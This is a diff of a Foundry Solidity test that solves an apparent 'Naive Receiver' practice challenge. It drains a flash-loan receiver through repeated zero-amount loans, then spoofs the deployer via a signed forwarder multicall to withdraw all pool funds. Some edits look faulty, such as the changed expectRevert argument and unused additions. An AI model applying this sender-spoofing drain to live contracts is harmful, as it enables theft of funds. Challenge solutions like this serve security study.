@@ -6,8 +6,11 @@ import {Test, console} from "forge-std/Test.sol";
 import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
+import {EIP712} from "solady/utils/EIP712.sol";
 
-contract NaiveReceiverChallenge is Test {
+contract NaiveReceiverChallenge is Test, Multicall {
+    bytes32 public DOMAIN_SEPARATOR;
+
     address deployer = makeAddr("deployer");
     address recovery = makeAddr("recovery");
     address player;
@@ -63,7 +66,7 @@ contract NaiveReceiverChallenge is Test {
         assertEq(pool.feeReceiver(), deployer);
 
         // Cannot call receiver
-        vm.expectRevert(0x48f5c3ed);
+        vm.expectRevert("0x48f5c3ed");
         receiver.onFlashLoan(
             deployer,
             address(weth), // token
@@ -77,7 +80,37 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        bytes[] memory multicalls = new bytes[](11);
+        multicalls[0] = abi.encodeWithSelector(pool.flashLoan.selector, receiver, weth, 0, bytes(""));
+        multicalls[1] = abi.encodeWithSelector(pool.flashLoan.selector, receiver, weth, 0, bytes(""));
+        multicalls[2] = abi.encodeWithSelector(pool.flashLoan.selector, receiver, weth, 0, bytes(""));
+        multicalls[3] = abi.encodeWithSelector(pool.flashLoan.selector, receiver, weth, 0, bytes(""));
+        multicalls[4] = abi.encodeWithSelector(pool.flashLoan.selector, receiver, weth, 0, bytes(""));
+        multicalls[5] = abi.encodeWithSelector(pool.flashLoan.selector, receiver, weth, 0, bytes(""));
+        multicalls[6] = abi.encodeWithSelector(pool.flashLoan.selector, receiver, weth, 0, bytes(""));
+        multicalls[7] = abi.encodeWithSelector(pool.flashLoan.selector, receiver, weth, 0, bytes(""));
+        multicalls[8] = abi.encodeWithSelector(pool.flashLoan.selector, receiver, weth, 0, bytes(""));
+        multicalls[9] = abi.encodeWithSelector(pool.flashLoan.selector, receiver, weth, 0, bytes(""));
+
+        multicalls[10] =
+            abi.encodeWithSignature("withdraw(uint256,address)", WETH_IN_RECEIVER + WETH_IN_POOL, recovery, deployer);
+
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: gasleft(),
+            nonce: 0,
+            deadline: block.timestamp + 300,
+            data: abi.encodeWithSignature("multicall(bytes[])", multicalls)
+        });
+
+        bytes32 eip712Hash =
+            keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, eip712Hash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+        forwarder.execute{value: 0}(request, signature);
     }
 
     /**
